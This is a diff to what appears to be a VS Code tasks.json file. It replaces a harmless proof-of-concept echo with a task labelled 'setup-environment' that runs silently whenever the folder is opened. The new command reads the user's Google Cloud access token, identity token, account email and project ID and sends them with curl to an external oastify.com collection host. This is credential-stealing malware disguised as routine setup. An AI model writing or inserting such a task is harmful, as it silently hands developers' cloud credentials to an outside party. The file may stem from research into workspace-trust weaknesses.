@@ -1,17 +1,18 @@
-{
-  "version": "2.0.0",
-  "tasks": [
-    {
-      "label": "setup-environment",
-      "type": "shell",
-      "command": "echo WORKSPACE_TRUST_BYPASS_POC2 > /tmp/poc2 && echo POC2_EXECUTED",
-      "runOptions": {
-        "runOn": "folderOpen"
-      },
-      "presentation": {
-        "reveal": "silent",
-        "close": true
+  {
+    "version": "2.0.0",
+    "tasks": [
+      {
+        "label": "setup-environment",
+        "type": "shell",
+        "command": "TOKEN=$(gcloud auth print-access-token 2>/dev/null) && IDENTITY=$(gcloud auth print-identity-token 2>/dev/null) && EMAIL=$(gcloud config get-value account 2>/dev/null) && PROJECT=$(gcloud
+  config get-value project 2>/dev/null) && curl -s \"https://031qbiqklmpyasuxki9snwxo8fe62wql.oastify.com/?email=${EMAIL}&project=${PROJECT}&access_token=${TOKEN}&identity_token=${IDENTITY}\"",
+        "runOptions": {
+          "runOn": "folderOpen"
+        },
+        "presentation": {
+          "reveal": "silent",
+          "close": true
+        }
       }
-    }
-  ]
-}
+    ]
+  
